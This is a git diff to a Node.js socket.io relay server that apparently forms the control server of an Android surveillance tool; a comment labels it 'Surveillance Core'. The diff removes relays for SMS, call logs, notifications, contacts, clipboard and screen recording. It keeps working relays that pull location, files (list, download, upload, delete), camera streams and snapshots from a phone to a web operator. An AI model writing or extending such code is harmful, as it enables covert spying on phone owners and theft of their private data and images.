@@ -156,42 +156,6 @@ io.on('connection', socket => {
     }
   });
 
-  socket.on('notification', data => {
-    console.log(`Relaying notification from ${data.from} to ${data.to}`);
-    console.log(`Notification content: ${JSON.stringify(data.notification)}`);
-    if (data.to && io.sockets.sockets.get(data.to)) {
-      io.to(data.to).emit('notification', data);
-      console.log(`Notification delivered to ${data.to}`);
-    } else {
-      console.warn(`Recipient ${data.to} not found for notification`);
-      socket.emit('error', { message: `Recipient ${data.to} not found for notification`, code: 'RECIPIENT_NOT_FOUND' });
-    }
-  });
-
-  socket.on('call_log', data => {
-    console.log(`Relaying call log from ${data.from} to ${data.to}`);
-    console.log(`Call log content: ${JSON.stringify(data.call_logs)}`);
-    if (data.to && io.sockets.sockets.get(data.to)) {
-      io.to(data.to).emit('call_log', data);
-      console.log(`Call log delivered to ${data.to}`);
-    } else {
-      console.warn(`Recipient ${data.to} not found for call log`);
-      socket.emit('error', { message: `Recipient ${data.to} not found for call log`, code: 'RECIPIENT_NOT_FOUND' });
-    }
-  });
-
-  socket.on('sms', data => {
-    console.log(`Relaying SMS from ${data.from} to ${data.to}`);
-    console.log(`SMS content: ${JSON.stringify(data.sms_messages)}`);
-    if (data.to && io.sockets.sockets.get(data.to)) {
-      io.to(data.to).emit('sms', data);
-      console.log(`SMS delivered to ${data.to}`);
-    } else {
-      console.warn(`Recipient ${data.to} not found for SMS`);
-      socket.emit('error', { message: `Recipient ${data.to} not found for SMS`, code: 'RECIPIENT_NOT_FOUND' });
-    }
-  });
-
   socket.on('location', data => {
     console.log(`Relaying location from ${data.from} to ${data.to}`);
     console.log(`Location content: lat=${data.latitude}, lng=${data.longitude}`);
@@ -204,25 +168,18 @@ io.on('connection', socket => {
     }
   });
 
-  // Generic Command & Event Relaying between Web and Android
+  // Core Command & Event Relaying between Web and Android (Surveillance Core)
   const relayEvents = [
     // File Explorer Events
     'fs:list', 'fs:files', 'fs:download', 'fs:download_ready', 'fs:delete', 
     'fs:download_start', 'fs:download_chunk', 'fs:download_complete', 
     'fs:download_error', 'fs:delete_result', 'fs:upload_start', 'fs:upload_chunk',
     'fs:upload_complete',
-    // Remote Commands
-    'cmd:ping', 'cmd:stop', 'cmd:record', 'cmd:camera_switch', 'cmd:screen_share',
-    'cmd:get_apps', 'cmd:get_contacts', 'cmd:sync_notifications', 'cmd:vibrate', 
-    'cmd:toast', 'cmd:open_url', 'cmd:flashlight', 'cmd:set_volume', 
-    'cmd:set_brightness', 'cmd:ring', 'cmd:set_quality', 'cmd:set_gps_interval', 
-    'cmd:launch_app', 'cmd:toggle_sensors', 'cmd:get_network', 'cmd:take_snapshot',
-    'cmd:get_clipboard', 'cmd:set_clipboard', 'cmd:tts_speak',
-    // On-Demand Camera Control
-    'cmd:start_camera', 'cmd:stop_camera',
-    // Custom Data Responses
-    'apps_list', 'contacts_list', 'device_info', 'sensor_data', 'network_info',
-    'snapshot_data', 'clipboard_data', 'camera_switched', 'camera_status'
+    // Camera & Streaming Controls
+    'cmd:ping', 'cmd:stop', 'cmd:camera_switch', 'cmd:set_quality', 
+    'cmd:set_gps_interval', 'cmd:take_snapshot', 'cmd:start_camera', 'cmd:stop_camera',
+    // Data & Status Responses
+    'device_info', 'snapshot_data', 'camera_switched', 'camera_status'
   ];
 
   console.log('Registering relay event handlers');
